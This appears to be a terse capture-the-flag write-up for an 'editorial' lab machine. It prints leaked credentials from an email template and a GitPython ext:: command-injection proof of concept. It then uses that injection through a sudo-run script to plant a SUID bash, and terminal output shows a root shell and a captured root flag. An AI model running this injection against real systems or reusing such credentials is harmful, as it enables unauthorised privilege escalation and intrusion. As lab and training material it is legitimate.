

```
'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```


```
Username: prod 
Password: 080217_Producti0n_2023!@
```


```
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```


```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp/bash% &&% chmod% u+s% /tmp/bash'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  Fil    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cp% /bin/bash% /tmp/bash% &&% chmod% u+s% /tmp/bash new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /tmp/
total 1408
drwxrwxrwt  8 root root    4096 Jun 18 15:46 .
drwxr-xr-x 18 root root    4096 Jun  5 14:54 ..
-rwsr-xr-x  1 root root 1396520 Jun 18 15:46 bash
-rw-rw-r--  1 prod prod      52 Jun 18 14:16 exploit.sh
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .font-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .ICE-unix
drwxrwxr-x  2 dev  dev     4096 Jun 18 13:07 .lin
-rw-rw-r--  1 dev  dev     1919 Jun 18 13:07 passwd.bak
-rw-r--r--  1 root root       6 Jun 18 15:41 pwned
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .Test-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .X11-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .XIM-unix
prod@editorial:/opt/internal_apps/clone_changes$ /tmp/bash -p
bash-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
bash-5.1#
```


```
dev@editorial:/tmp$ cat root
404b94a72bed6bec07d516da706117d2
```




---

# Reference

https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858